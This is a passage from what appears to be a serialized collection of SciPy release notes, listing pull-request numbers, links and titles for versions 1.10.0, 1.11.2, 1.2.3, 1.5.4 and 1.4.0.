\\`[source]\\` button redicting to the wrong...\n* `17534 <https://github.com/scipy/scipy/pull/17534>`__: DOC: 1.10.0 release notes\n* `17536 <https://github.com/scipy/scipy/pull/17536>`__: DOC: Examples for \\`yve\\` and \\`jve\\`\n* `17540 <https://github.com/scipy/scipy/pull/17540>`__: DOC: fix documentation of \\`make_smoothing_spline\\`\n* `17543 <https://github.com/scipy/scipy/pull/17543>`__: CI: fix gh17539 failures of the alpine linux run\n* `17545 <https://github.com/scipy/scipy/pull/17545>`__: BUG: special: Fix handling of subnormal input for lambertw.\n* `17551 <https://github.com/scipy/scipy/pull/17551>`__: BUG Fix: Update lobpcg.py to turn history arrays into lists for...\n* `17569 <https://github.com/scipy/scipy/pull/17569>`__: MAINT: version bounds for 1.10.0rc1/relnotes fixes\n* `17579 <https://github.com/scipy/scipy/pull/17579>`__: Revert \"ENH: stats.ks_2samp: Pythranize remaining exact p-value...\n* `17580 <https://github.com/scipy/scipy/pull/17580>`__: CI: native cp38-macosx_arm64 [wheel build][skip azp][skip circle][ski\u2026\n* `17583 <https://github.com/scipy/scipy/pull/17583>`__: MAINT: 1.10.0rc1 backports round 2\n* `17591 <https://github.com/scipy/scipy/pull/17591>`__: MAINT: stats.pearsonr: raise error for complex input\n* `17600 <https://github.com/scipy/scipy/pull/17600>`__: DOC: update version switcher for 1.10\n* `17611 <https://github.com/scipy/scipy/pull/17611>`__: MAINT: Update ascent.dat file hash\n* `17614 <https://github.com/scipy/scipy/pull/17614>`__: MAINT: optimize.milp: don't warn about \\`mip_rel_gap\\` option\n* `17627 <https://github.com/scipy/scipy/pull/17627>`__: MAINT: Cast \\`datasets.ascent\\` image to float64\n* `17634 <https://github.com/scipy/scipy/pull/17634>`__: MAINT: casting errstate for NumPy 1.24\n* `17638 <https://github.com/scipy/scipy/pull/17638>`__: MAINT, TST: alpine/musl segfault shim\n* `17640 <https://github.com/scipy/scipy/pull/17640>`__: MAINT: prepare for SciPy 1.10.0rc2\n* `17645 <https://github.com/scipy/scipy/pull/17645>`__: MAINT: stats.rankdata: ensure consistent shape handling\n* `17653 <https://github.com/scipy/scipy/pull/17653>`__: MAINT: pybind11 win exclusion\n* `17656 <https://github.com/scipy/scipy/pull/17656>`__: MAINT: 1.10.0rc2 backports, round two\n* `17662 <https://github.com/scipy/scipy/pull/17662>`__: Fix undefined behavior within scipy.fft\n* `17686 <https://github.com/scipy/scipy/pull/17686>`__: REV: integrate.qmc_quad: delay release to SciPy 1.11.0\n* `17689 <https://github.com/scipy/scipy/pull/17689>`__: REL: integrate.qmc_quad: remove from release notes\n\n\n==========================\n", "1.11.2": "------------------------\n\n* `17918 <https://github.com/scipy/scipy/pull/17918>`__: BUG: Fix error in linalg/_matfuncs_sqrtm.py\n* `18644 <https://github.com/scipy/scipy/pull/18644>`__: BUG: sparse.linalg: Cast index arrays to intc before calling...\n* `18784 <https://github.com/scipy/scipy/pull/18784>`__: Allow johnsonsu parameters to be floats\n* `18785 <https://github.com/scipy/scipy/pull/18785>`__: MAINT: stats: fix NumPy DeprecationWarnings\n* `18787 <https://github.com/scipy/scipy/pull/18787>`__: REL, MAINT: prep for 1.11.2\n* `18790 <https://github.com/scipy/scipy/pull/18790>`__: DOC: Fix broken link to installation guide in README\n* `18804 <https://github.com/scipy/scipy/pull/18804>`__: BUG: Ensure cKDtree.query does not pass Pandas DataFrame to np.isfinite\n* `18809 <https://github.com/scipy/scipy/pull/18809>`__: CI, MAINT: 32-bit Pillow pin\n* `18810 <https://github.com/scipy/scipy/pull/18810>`__: BLD: copy \\`cython_optimize.pxd\\` to build dir\n* `18825 <https://github.com/scipy/scipy/pull/18825>`__: BUG: make \\`L-BFGS-B\\` optimizer work with single precision gradient\n* `18831 <https://github.com/scipy/scipy/pull/18831>`__: BUG: io/matlab: Fix loading of mat files containing fn handles...\n* `18859 <https://github.com/scipy/scipy/pull/18859>`__: BUG: make Bessel-roots function not hang and not skip roots\n* `18894 <https://github.com/scipy/scipy/pull/18894>`__: DOC: linking interp1d docstring to tutorial\n* `18896 <https://github.com/scipy/scipy/pull/18896>`__: BUG: lsq trf gives x=1e-10 if x0 is near a bound\n* `18937 <https://github.com/scipy/scipy/pull/18937>`__: CI/BLD: create cp312 wheels\n* `18961 <https://github.com/scipy/scipy/pull/18961>`__: DOC: Fix installation instructions using venv/pip\n* `18985 <https://github.com/scipy/scipy/pull/18985>`__: CI: move the musllinux Cirrus job to GHA, optimize other jobs\n* `18999 <https://github.com/scipy/scipy/pull/18999>`__: CI: reduce Cirrus CI usage during wheel builds\n* `19004 <https://github.com/scipy/scipy/pull/19004>`__: BUG: interpolate: fix spalde with len(c) < len(t)\n* `19025 <https://github.com/scipy/scipy/pull/19025>`__: BUG: pass unused xrtol in fmin_bfgs to _minimize_bfgs\n* `19027 <https://github.com/scipy/scipy/pull/19027>`__: BLD: rename \\`setup.py\\` to \\`_setup.py\\` to signal it should...\n* `19034 <https://github.com/scipy/scipy/pull/19034>`__: MAINT: NumPy 1.25.x deprecations\n* `19054 <https://github.com/scipy/scipy/pull/19054>`__: MAINT: ensure cobyla objective returns scalar\n\n\n==========================\n", "1.2.3": "-----------------------\n* `9992 <https://github.com/scipy/scipy/pull/9992>`__: MAINT: Undo Sphinx pin \n* `10071 <https://github.com/scipy/scipy/pull/10071>`__: DOC: reconstruct SuperLU permutation matrices avoiding SparseEfficiencyWarning\n* `10076 <https://github.com/scipy/scipy/pull/10076>`__: BUG: optimize: fix curve_fit for mixed float32/float64 input\n* `10138 <https://github.com/scipy/scipy/pull/10138>`__: BUG: special: Invalid arguments to ellip_harm can crash Python.\n* `10306 <https://github.com/scipy/scipy/pull/10306>`__: BUG: optimize: Fix for 10303\n* `10309 <https://github.com/scipy/scipy/pull/10309>`__: BUG: Pass jac=None directly to lsoda\n* `10377 <https://github.com/scipy/scipy/pull/10377>`__: TST, MAINT: adjustments for pytest 5.0\n* `10379 <https://github.com/scipy/scipy/pull/10379>`__: BUG: sparse: set writeability to be forward-compatible with numpy>=1.17\n* `10426 <https://github.com/scipy/scipy/pull/10426>`__: MAINT: Fix doc build bugs\n* `10540 <https://github.com/scipy/scipy/pull/10540>`__: MAINT: Fix Travis and Circle \n* `10633 <https://github.com/scipy/scipy/pull/10633>`__: BUG: interpolate: integral(a, b) should be zero when both limits are outside of the interpolation range\n* `10833 <https://github.com/scipy/scipy/pull/10833>`__: BUG: Fix subspace_angles for complex values\n* `10882 <https://github.com/scipy/scipy/pull/10882>`__: BUG: sparse/arpack: fix incorrect code for complex hermitian M\n* `10906 <https://github.com/scipy/scipy/pull/10906>`__: BUG: sparse/linalg: fix expm for np.matrix inputs\n* `10961 <https://github.com/scipy/scipy/pull/10961>`__: BUG: Fix signal.unique_roots\n* `11126 <https://github.com/scipy/scipy/pull/11126>`__: BUG: interpolate/fitpack: fix memory leak in splprep\n* `11199 <https://github.com/scipy/scipy/pull/11199>`__: BUG: sparse.linalg: mistake in unsymm. real shift-invert ARPACK eigenvalue selection\n* `11269 <https://github.com/scipy/scipy/pull/11269>`__: Fix: Sparse matrix constructor data type detection changes on Numpy 1.18.0\n\n\n\n\n==========================\n", "1.5.4": "-----------------------\n\n* `12790 <https://github.com/scipy/scipy/pull/12790>`__: TST: Skip TestConvolve2d.test_large_array if not enough memory\n* `12851 <https://github.com/scipy/scipy/pull/12851>`__: BUG: sparse: fix inner indexed assignment of a 1d array\n* `12875 <https://github.com/scipy/scipy/pull/12875>`__: BUG: segfault in ndimage.fourier_ellipsoid with length-1 dims\n* `12937 <https://github.com/scipy/scipy/pull/12937>`__: CI: macOS3.9 testing\n* `12957 <https://github.com/scipy/scipy/pull/12957>`__: MAINT: fixes XCode 12/ python 3.9.0 build for 1.5.x maint branch\n* `12959 <https://github.com/scipy/scipy/pull/12959>`__: CI: add Windows Python 3.9 to CI\n* `12974 <https://github.com/scipy/scipy/pull/12974>`__: MAINT: Run lint_diff.py against the merge target and only for...\n* `12978 <https://github.com/scipy/scipy/pull/12978>`__: DOC: next_fast_len output doesn't match docstring\n* `12979 <https://github.com/scipy/scipy/pull/12979>`__: BUG: fft.next_fast_len should accept keyword arguments\n* `12989 <https://github.com/scipy/scipy/pull/12989>`__: BUG: improved the stability of kde for highly (1000s) multi-dimension...\n* `13017 <https://github.com/scipy/scipy/pull/13017>`__: BUG: Add explicit cast to _tmp sum.\n* `13022 <https://github.com/scipy/scipy/pull/13022>`__: TST: xfail test_maxiter_worsening()\n\n\n==========================\n", "1.4.0": "-----------------------\n\n* `4591 <https://github.com/scipy/scipy/pull/4591>`__: BUG, TST: Several issues with scipy.signal.residue\n* `6629 <https://github.com/scipy/scipy/pull/6629>`__: ENH: sparse: canonicalize on initialization\n* `7076 <https://github.com/scipy/scipy/pull/7076>`__: ENH: add complex wavelet support to scipy.signal.cwt.\n* `8681 <https://github.com/scipy/scipy/pull/8681>`__: ENH add generalized inverse Gaussian distribution to scipy.stats\n* `9064 <https://github.com/scipy/scipy/pull/9064>`__: BUG/ENH: Added default _transpose into LinearOperator. Fixes...\n* `9215 <https://github.com/scipy/scipy/pull/9215>`__: ENH: Rbf interpolation of large multi-dimensional data\n* `9311 <https://github.com/scipy/scipy/pull/9311>`__: ENH: Added voigt in scipy.special.\n* `9642 <https://github.com/scipy/scipy/pull/9642>`__: ENH: integrate: quad() for vector-valued functions\n* `9679 <https://github.com/scipy/scipy/pull/9679>`__: DOC: expand docstring of exponweib distribution\n* `9684 <https://github.com/scipy/scipy/pull/9684>`__: TST: add ppc64le ci testing\n* `9800 <https://github.com/scipy/scipy/pull/9800>`__: WIP : ENH: Refactored _hungarian.py for speed and added a minimize/maximize\u2026\n* `9847 <https://github.com/scipy/scipy/pull/9847>`__: DOC: Change integrate tutorial to use solve_ivp instead of odeint\n* `9876 <https://github.com/scipy/scipy/pull/9876>`__: ENH: Use rfft when possible in resampling\n* `9998 <https://github.com/scipy/scipy/pull/9998>`__: BUG: Do not remove 1s when calling sparse: reshape method #9994\n* `10002 <https://github.com/scipy/scipy/pull/10002>`__: ENH: adds constraints for differential evolution\n* `10098 <https://github.com/scipy/scipy/pull/10098>`__: ENH: integrate: add args argument to solve_ivp.\n* `10099 <https://github.com/scipy/scipy/pull/10099>`__: DOC: Add missing docs for linprog unknown_options\n* `10104 <https://github.com/scipy/scipy/pull/10104>`__: BUG: Rewrite of stats.truncnorm distribution.\n* `10105 <https://github.com/scipy/scipy/pull/10105>`__: MAINT improve efficiency of rvs_ratio_uniforms in scipy.stats\n* `10107 <https://github.com/scipy/scipy/pull/10107>`__: TST: dual_annealing set seed\n* `10108 <https://github.com/scipy/scipy/pull/10108>`__: ENH: stats: improve kendall_tau cache usage\n* `10110 <https://github.com/scipy/scipy/pull/10110>`__: MAINT: _lib: Fix a build warning.\n* `10114 <https://github.com/scipy/scipy/pull/10114>`__: FIX: only print bounds when supported by minimizer (shgo)\n* `10115 <https://github.com/scipy/scipy/pull/10115>`__: TST: Add a test with an almost singular design matrix for lsq_linear\n* `10118 <https://github.com/scipy/scipy/pull/10118>`__: MAINT: fix rdist methods in scipy.stats\n* `10119 <https://github.com/scipy/scipy/pull/10119>`__: MAINT: improve rvs of randint in scipy.stats\n* `10127 <https://github.com/scipy/scipy/pull/10127>`__: Fix typo in record array field name (spatial-ckdtree-sparse_distance\u2026\n* `10130 <https://github.com/scipy/scipy/pull/10130>`__: MAINT: ndimage: Fix some compiler warnings.\n* `10131 <https://github.com/scipy/scipy/pull/10131>`__: DOC: Note the solve_ivp args enhancement in the 1.4.0 release...\n* `10133 <https://github.com/scipy/scipy/pull/10133>`__: MAINT: add rvs for semicircular in scipy.stats\n* `10138 <https://github.com/scipy/scipy/pull/10138>`__: BUG: special: Invalid arguments to ellip_harm can crash Python.\n* `10139 <https://github.com/scipy/scipy/pull/10139>`__: MAINT: spatial: Fix some compiler warnings in the file distance_wrap.c.\n* `10140 <https://github.com/scipy/scipy/pull/10140>`__: ENH: add handling of NaN in RuntimeWarning except clause\n* `10142 <https://github.com/scipy/scipy/pull/10142>`__: DOC: return value of scipy.special.comb\n* `10143 <https://github.com/scipy/scipy/pull/10143>`__: MAINT: Loosen linprog tol\n* `10152 <https://github.com/scipy/scipy/pull/10152>`__: BUG: Fix custom sampling input for shgo, add unittest\n* `10154 <https://github.com/scipy/scipy/pull/10154>`__: MAINT: add moments and improve doc of mielke in scipy.stats\n* `10158 <https://github.com/scipy/scipy/pull/10158>`__: Issue #6999: read zlib checksum before checking bytes read.\n* `10166 <https://github.com/scipy/scipy/pull/10166>`__: BUG: Correctly handle broadcasted ydata in curve_fit pcov computation.\n* `10167 <https://github.com/scipy/scipy/pull/10167>`__: DOC: special: Add missing factor of \\`i\\` to \\`modstruve\\` docstring\n* `10168 <https://github.com/scipy/scipy/pull/10168>`__: MAINT: stats: Fix an incorrect comment.\n* `10169 <https://github.com/scipy/scipy/pull/10169>`__: ENH: optimize: Clarify error when objective function returns...\n* `10172 <https://github.com/scipy/scipy/pull/10172>`__: DEV: Run tests in parallel when --parallel flag is passed to...\n* `10173 <https://github.com/scipy/scipy/pull/10173>`__: ENH: Implement DOP853 ODE integrator\n* `10176 <https://github.com/scipy/scipy/pull/10176>`__: Fixed typo\n* `10182 <https://github.com/scipy/scipy/pull/10182>`__: TST: fix test issue for stats.pearsonr\n* `10184 <https://github.com/scipy/scipy/pull/10184>`__: MAINT: stats: Simplify zmap and zscore (we can use keepdims now).\n* `10191 <https://github.com/scipy/scipy/pull/10191>`__: DOC: fix a formatting issue in the scipy.spatial module docstring.\n* `10193 <https://github.com/scipy/scipy/pull/10193>`__: DOC: Updated docstring for optimize.nnls\n* `10198 <https://github.com/scipy/scipy/pull/10198>`__: DOC, ENH: special: Make \\`hyp2f1\\` references more specific\n* `10202 <https://github.com/scipy/scipy/pull/10202>`__: DOC: Format DST and DCT definitions as latex equations\n* `10207 <https://github.com/scipy/scipy/pull/10207>`__: BUG: Compressed matrix indexing should return a scalar\n* `10210 <https://github.com/scipy/scipy/pull/10210>`__: DOC: Update docs for connection='weak' in connected_components\n* `10225 <https://github.com/scipy/scipy/pull/10225>`__: DOC: Clarify new interfaces for legacy functions in 'optimize'\n* `10231 <https://github.com/scipy/scipy/pull/10231>`__: DOC, MAINT: gpg2 updates to release docs / pavement\n* `10235 <https://github.com/scipy/scipy/pull/10235>`__: LICENSE: split license file in standard BSD 3-clause and bundled.\n* `10238 <https://github.com/scipy/scipy/pull/10238>`__: ENH: Add new scipy.fft module using pocketfft\n* `10243 <https://github.com/scipy/scipy/pull/10243>`__: BUG: fix ARFF reader regression with quoted values.\n* `10248 <https://github.com/scipy/scipy/pull/10248>`__: DOC: update README file\n* `10255 <https://github.com/scipy/scipy/pull/10255>`__: CI: bump OpenBLAS to match wheels\n* `10264 <https://github.com/scipy/scipy/pull/10264>`__: TST: add tests for stats.tvar with unflattened arrays\n* `10280 <https://github.com/scipy/scipy/pull/10280>`__: MAINT: stats: Use a constant value for sqrt(2/PI).\n* `10286 <https://github.com/scipy/scipy/pull/10286>`__: Development Documentation Overhaul\n* `10290 <https://github.com/scipy/scipy/pull/10290>`__: MAINT: Deprecate NumPy functions in SciPy root\n* `10291 <https://github.com/scipy/scipy/pull/10291>`__: FIX: Avoid importing xdist when checking for availability\n* `10295 <https://github.com/scipy/scipy/pull/10295>`__: Disable deprecated Numpy API in __odrpack.c\n* `10296 <https://github.com/scipy/scipy/pull/10296>`__: ENH: C++ extension for linear assignment problem\n* `10298 <https://github.com/scipy/scipy/pull/10298>`__: ENH: Made pade function work with complex inputs\n* `10301 <https://github.com/scipy/scipy/pull/10301>`__: DOC: Fix critical value significance levels in stats.anderson_ksamp\n* `10307 <https://github.com/scipy/scipy/pull/10307>`__: Minkowski Distance Type Fix (issue #10262)\n* `10309 <https://github.com/scipy/scipy/pull/10309>`__: BUG: Pass jac=None directly to lsoda\n* `10310 <https://github.com/scipy/scipy/pull/10310>`__: BUG: interpolate: UnivariateSpline.derivative.ext is 'zeros'...\n* `10312 <https://github.com/scipy/scipy/pull/10312>`__: FIX: Fixing a typo in a comment\n* `10314 <https://github.com/scipy/scipy/pull/10314>`__: scipy.spatial enhancement request\n* `10315 <https://github.com/scipy/scipy/pull/10315>`__: DOC: Update integration tutorial to solve_ivp\n* `10318 <https://github.com/scipy/scipy/pull/10318>`__: DOC: update the example for PPoly.solve\n* `10333 <https://github.com/scipy/scipy/pull/10333>`__: TST: add tests for stats.tvar with unflattened arrays\n* `10334 <https://github.com/scipy/scipy/pull/10334>`__: MAINT: special: Remove deprecated \\`hyp2f0\\`, \\`hyp1f2\\`, and...\n* `10336 <https://github.com/scipy/scipy/pull/10336>`__: BUG: linalg/interpolative: fix interp_decomp modifying input\n* `10341 <https://github.com/scipy/scipy/pull/10341>`__: BUG: sparse.linalg/gmres: deprecate effect of callback on semantics...\n* `10344 <https://github.com/scipy/scipy/pull/10344>`__: DOC: improve wording of mathematical formulation\n* `10345 <https://github.com/scipy/scipy/pull/10345>`__: ENH: Tiled QR wrappers for scipy.linalg.lapack\n* `10350 <https://github.com/scipy/scipy/pull/10350>`__: MAINT: linalg: Use the new fft subpackage in linalg.dft test...\n* `10351 <https://github.com/scipy/scipy/pull/10351>`__: BUG: Fix unstable standard deviation calculation in histogram\n* `10353 <https://github.com/scipy/scipy/pull/10353>`__: Bug: interpolate.NearestNDInterpolator (issue #10352)\n* `10357 <https://github.com/scipy/scipy/pull/10357>`__: DOC: linalg: Refer to scipy.fft.fft (not fftpack) in the dft...\n* `10359 <https://github.com/scipy/scipy/pull/10359>`__: DOC: Update roadmap now scipy.fft has been merged\n* `10361 <https://github.com/scipy/scipy/pull/10361>`__: ENH: Prefer scipy.fft to scipy.fftpack in scipy.signal\n* `10371 <https://github.com/scipy/scipy/pull/10371>`__: DOC: Tweaks to fft documentation\n* `10372 <https://github.com/scipy/scipy/pull/10372>`__: DOC: Fix typos\n* `10377 <https://github.com/scipy/scipy/pull/10377>`__: TST, MAINT: adjustments for pytest 5.0\n* `10378 <https://github.com/scipy/scipy/pull/10378>`__: ENH: _lib: allow new np.random.Generator in check_random_state\n* `10379 <https://github.com/scipy/scipy/pull/10379>`__: BUG: sparse: set writeability to be forward-compatible with numpy>=1.17\n* `10381 <https://github.com/scipy/scipy/pull/10381>`__: BUG: Fixes gh-7491, pdf at x=0 of fisk/burr/burr12/f distributions.\n* `10387 <https://github.com/scipy/scipy/pull/10387>`__: ENH: optimize/bfgs: don't evaluate twice at initial point for...\n* `10392 <https://github.com/scipy/scipy/pull/10392>`__: [DOC] Add an example for _binned_statistic_dd\n* `10396 <https://github.com/scipy/scipy/pull/10396>`__: Remove warning about output shape of zoom\n* `10397 <https://github.com/scipy/scipy/pull/10397>`__: ENH: Add check_finite to sp.linalg.norm\n* `10399 <https://github.com/scipy/scipy/pull/10399>`__: ENH: Add __round__ method to sparse matrix\n* `10407 <https://github.com/scipy/scipy/pull/10407>`__: MAINT: drop pybind11 from install_requires, it's only build-time...\n* `10408 <https://github.com/scipy/scipy/pull/10408>`__: TST: use pytest.raises, not numpy assert_raises\n* `10409 <https://github.com/scipy/scipy/pull/10409>`__: CI: uninstall nose on Travis\n* `10410 <https://github.com/scipy/scipy/pull/10410>`__: [ENH] ncx2 dispatch to chi2 when nc=0\n* `10411 <https://github.com/scipy/scipy/pull/10411>`__: TST: optimize: test should use assert_allclose for fp comparisons\n* `10414 <https://github.com/scipy/scipy/pull/10414>`__: DOC: add pybind11 to the other part of quickstart guides\n* `10417 <https://github.com/scipy/scipy/pull/10417>`__: DOC: special: don't mark non-ufuncs with a \\`[+]\\`\n* `10423 <https://github.com/scipy/scipy/pull/10423>`__: FIX: Use pybind11::isinstace to check array dtypes\n* `10424 <https://github.com/scipy/scipy/pull/10424>`__: DOC: add doctest example for binary data for ttest_ind_from_stats\n* `10425 <https://github.com/scipy/scipy/pull/10425>`__: ENH: Add missing Hermitian transforms to scipy.fft\n* `10426 <https://github.com/scipy/scipy/pull/10426>`__: MAINT: Fix doc build bugs\n* `10431 <https://github.com/scipy/scipy/pull/10431>`__: Update numpy version for AIX\n* `10433 <https://github.com/scipy/scipy/pull/10433>`__: MAINT: Minor fixes for the stats\n* `10434 <https://github.com/scipy/scipy/pull/10434>`__: BUG: special: make \\`ndtri\\` return NaN outside domain of definition\n* `10435 <https://github.com/scipy/scipy/pull/10435>`__: BUG: Allow integer input data in scipy.stats.yeojohnson\n* `10438 <https://github.com/scipy/scipy/pull/10438>`__: [DOC] Add example for kurtosis\n* `10440 <https://github.com/scipy/scipy/pull/10440>`__: ENH: special: make \\`ellipk\\` a ufunc\n* `10443 <https://github.com/scipy/scipy/pull/10443>`__: MAINT: ndimage: malloc fail check\n* `10447 <https://github.com/scipy/scipy/pull/10447>`__: BLD: Divert output from test compiles into a temporary directory\n* `10451 <https://github.com/scipy/scipy/pull/10451>`__: MAINT: signal: malloc fail check\n* `10455 <https://github.com/scipy/scipy/pull/10455>`__: BUG: special: fix values of \\`hyperu\\` for negative \\`x\\`\n* `10456 <https://github.com/scipy/scipy/pull/10456>`__: DOC: Added comment clarifying the call for dcsrch.f in lbfgsb.f\n* `10457 <https://github.com/scipy/scipy/pull/10457>`__: BUG: Allow ckdtree to accept empty data input\n* `10459 <https://github.com/scipy/scipy/pull/10459>`__: BUG:TST: Compute lwork safely\n* `10460 <https://github.com/scipy/scipy/pull/10460>`__: [DOC] Add example to entropy\n* `10461 <https://github.com/scipy/scipy/pull/10461>`__: DOC: Quickstart Guide updates\n* `10462 <https://github.com/scipy/scipy/pull/10462>`__: TST: special: only show max atol/rtol for test points that failed\n* `10465 <https://github.com/scipy/scipy/pull/10465>`__: BUG: Correctly align fft inputs\n* `10467 <https://github.com/scipy/scipy/pull/10467>`__: ENH: lower-memory duplicate generator checking in spatial.SphericalVoronoi\n* `10470 <https://github.com/scipy/scipy/pull/10470>`__: ENH: Normalise the inverse DCT/DST in scipy.fft\n* `10472 <https://github.com/scipy/scipy/pull/10472>`__: BENCH: adjust timeout for slow setup_cache\n* `10475 <https://github.com/scipy/scipy/pull/10475>`__: CI: include python debug for Travis-ci\n* `10476 <https://github.com/scipy/scipy/pull/10476>`__: TST: special: use \\`__tracebackhide__\\` to get better error messages\n* `10477 <https://github.com/scipy/scipy/pull/10477>`__: ENH: faster region building in spatial.SphericalVoronoi\n* `10479 <https://github.com/scipy/scipy/pull/10479>`__: BUG: stats: Fix a few issues with the distributions' fit method.\n* `10480 <https://github.com/scipy/scipy/pull/10480>`__: Add RuntimeError in _distn_infrastructure.py in fit() method\n* `10481 <https://github.com/scipy/scipy/pull/10481>`__: BENCH, MAINT: wheel_cache_size has been renamed build_cache_size\n* `10494 <https://github.com/scipy/scipy/pull/10494>`__: ENH: faster circumcenter calculation in spatial.SphericalVoronoi\n* `10500 <https://github.com/scipy/scipy/pull/10500>`__: Splrep _curfit_cache global variable bugfix\n* `10503 <https://github.com/scipy/scipy/pull/10503>`__: BUG: spatial/qhull: get HalfspaceIntersection.dual_points from...\n* `10506 <https://github.com/scipy/scipy/pull/10506>`__: DOC: interp2d, note nearest neighbor extrapolation\n* `10507 <https://github.com/scipy/scipy/pull/10507>`__: MAINT: Remove fortran fftpack library in favour of pypocketfft\n* `10508 <https://github.com/scipy/scipy/pull/10508>`__: TST: fix a bug in the circular import test.\n* `10509 <https://github.com/scipy/scipy/pull/10509>`__: MAINT: Set up _build_utils as subpackage\n* `10516 <https://github.com/scipy/scipy/pull/10516>`__: BUG: Use nogil contexts in cKDTree\n* `10517 <https://github.com/scipy/scipy/pull/10517>`__: ENH: fftconvolve should not FFT broadcastable axes\n* `10518 <https://github.com/scipy/scipy/pull/10518>`__: ENH: Speedup fftconvolve\n* `10520 <https://github.com/scipy/scipy/pull/10520>`__: DOC: Proper .rst formatting for deprecated features and Backwards...\n* `10523 <https://github.com/scipy/scipy/pull/10523>`__: DOC: Improve scipy.signal.resample documentation\n* `10524 <https://github.com/scipy/scipy/pull/10524>`__: ENH: Add MGC to scipy.stats\n* `10525 <https://github.com/scipy/scipy/pull/10525>`__: [ENH] ncx2.ppf dispatch to chi2 when nc=0\n* `10526 <https://github.com/scipy/scipy/pull/10526>`__: DOC: clarify laplacian normalization\n* `10528 <https://github.com/scipy/scipy/pull/10528>`__: API: Rename scipy.fft DCT/DST shape argument to s\n* `10531 <https://github.com/scipy/scipy/pull/10531>`__: BUG: fixed improper rotations in spatial.transform.rotation.match_vectors\n* `10533 <https://github.com/scipy/scipy/pull/10533>`__: [DOC] Add example for winsorize function\n* `10539 <https://github.com/scipy/scipy/pull/10539>`__: MAINT: special: don't register \\`i0\\` with \\`numpy.dual\\`\n* `10540 <https://github.com/scipy/scipy/pull/10540>`__: MAINT: Fix Travis and Circle\n* `10542 <https://github.com/scipy/scipy/pull/10542>`__: MAINT: interpolate: use cython_lapack\n* `10547 <https://github.com/scipy/scipy/pull/10547>`__: Feature request. Add furthest site Voronoi diagrams to scipy.spatial.plotutils.\n* `10549 <https://github.com/scipy/scipy/pull/10549>`__: [BUG] Fix bug in trimr when inclusive=False\n* `10552 <https://github.com/scipy/scipy/pull/10552>`__: add scipy.signal.upfirdn signal extension modes\n* `10555 <https://github.com/scipy/scipy/pull/10555>`__: MAINT: special: move \\`c_misc\\` into Cephes\n* `10556 <https://github.com/scipy/scipy/pull/10556>`__: [DOC] Add example for trima\n* `10562 <https://github.com/scipy/scipy/pull/10562>`__: [DOC] Fix triple string fo trimmed so that __doc__ can show...\n* `10563 <https://github.com/scipy/scipy/pull/10563>`__: improve least_squares error msg for mismatched shape\n* `10564 <https://github.com/scipy/scipy/pull/10564>`__: ENH: linalg: memoize get_lapack/blas_funcs to speed it up\n* `10566 <https://github.com/scipy/scipy/pull/10566>`__: ENH: add implementation of solver for the maximum flow problem\n* `10567 <https://github.com/scipy/scipy/pull/10567>`__: BUG: spatial: use c++11 construct for getting start of vector...\n* `10568 <https://github.com/scipy/scipy/pull/10568>`__: DOC: special: small tweaks to the \\`zetac\\` docstring\n* `10571 <https://github.com/scipy/scipy/pull/10571>`__: [ENH] Gaussian_kde can accept matrix dataset\n* `10574 <https://github.com/scipy/scipy/pull/10574>`__: ENH: linalg: speed up _compute_lwork by avoiding numpy constructs\n* `10582 <https://github.com/scipy/scipy/pull/10582>`__: Fix typos with typos in bundled libraries reverted\n* `10583 <https://github.com/scipy/scipy/pull/10583>`__: ENH: special: add the analytic continuation of Riemann zeta\n* `10584 <https://github.com/scipy/scipy/pull/10584>`__: MAINT: special: clean up \\`special.__all__\\`\n* `10586 <https://github.com/scipy/scipy/pull/10586>`__: BUG: multidimensional scipy.fft functions should accept 's' rather...\n* `10587 <https://github.com/scipy/scipy/pull/10587>`__: BUG: integrate/lsoda: never abort run, set error istate instead\n* `10594 <https://github.com/scipy/scipy/pull/10594>`__: API: Replicate numpy's fftn behaviour when s is given but not...\n* `10599 <https://github.com/scipy/scipy/pull/10599>`__: DOC: dev: update documentation vs. github pull request workflow...\n* `10603 <https://github.com/scipy/scipy/pull/10603>`__: MAINT: installer scripts removed\n* `10604 <https://github.com/scipy/scipy/pull/10604>`__: MAINT: Change c\\*np.ones(...) to np.full(..., c, ...) in many...\n* `10608 <https://github.com/scipy/scipy/pull/10608>`__: Univariate splines should require x to be strictly increasing...\n* `10613 <https://github.com/scipy/scipy/pull/10613>`__: ENH: Add seed option for gaussian_kde.resample\n* `10614 <https://github.com/scipy/scipy/pull/10614>`__: ENH: Add parallel computation to scipy.fft\n* `10615 <https://github.com/scipy/scipy/pull/10615>`__: MAINT: interpolate: remove unused header file\n* `10616 <https://github.com/scipy/scipy/pull/10616>`__: MAINT: Clean up 32-bit platform xfail markers\n* `10618 <https://github.com/scipy/scipy/pull/10618>`__: BENCH: Added 'trust-constr' to minimize benchmarks\n* `10621 <https://github.com/scipy/scipy/pull/10621>`__: [MRG] multiple stability updates in lobpcg\n* `10622 <https://github.com/scipy/scipy/pull/10622>`__: MAINT: forward port 1.3.1 release notes\n* `10624 <https://github.com/scipy/scipy/pull/10624>`__: DOC: stats: Fix spelling of 'support'.\n* `10627 <https://github.com/scipy/scipy/pull/10627>`__: DOC: stats: Add references for the alpha distribution.\n* `10629 <https://github.com/scipy/scipy/pull/10629>`__: MAINT: special: avoid overflow longer in \\`zeta\\` for negative...\n* `10630 <https://github.com/scipy/scipy/pull/10630>`__: TST: GH10271, relax test assertion, fixes #10271\n* `10631 <https://github.com/scipy/scipy/pull/10631>`__: DOC: nelder-mean uses xatol fixes #10036\n* `10633 <https://github.com/scipy/scipy/pull/10633>`__: BUG: interpolate: integral(a, b) should be zero when both limits...\n* `10635 <https://github.com/scipy/scipy/pull/10635>`__: DOC: special: complete hypergeometric functions documentation\n* `10636 <https://github.com/scipy/scipy/pull/10636>`__: BUG: special: use series for \\`hyp1f1\\` when it converges rapidly\n* `10641 <https://github.com/scipy/scipy/pull/10641>`__: ENH: allow matching of general bipartite graphs\n* `10643 <https://github.com/scipy/scipy/pull/10643>`__: ENH: scipy.sparse.linalg.spsolve triangular unit diagonal\n* `10650 <https://github.com/scipy/scipy/pull/10650>`__: ENH: Cythonize sosfilt\n* `10654 <https://github.com/scipy/scipy/pull/10654>`__: DOC: Vertical alignment of table entries\n* `10655 <https://github.com/scipy/scipy/pull/10655>`__: ENH: Dockerfile for scipy development\n* `10660 <https://github.com/scipy/scipy/pull/10660>`__: TST: clean up tests for rvs in scipy.stats\n* `10664 <https://github.com/scipy/scipy/pull/10664>`__: Throw error on non-finite input for binned_statistic_dd()\n* `10665 <https://github.com/scipy/scipy/pull/10665>`__: DOC: special: improve the docstrings for \\`gamma\\` and \\`gammasgn\\`\n* `10669 <https://github.com/scipy/scipy/pull/10669>`__: TST: Update scipy.fft real 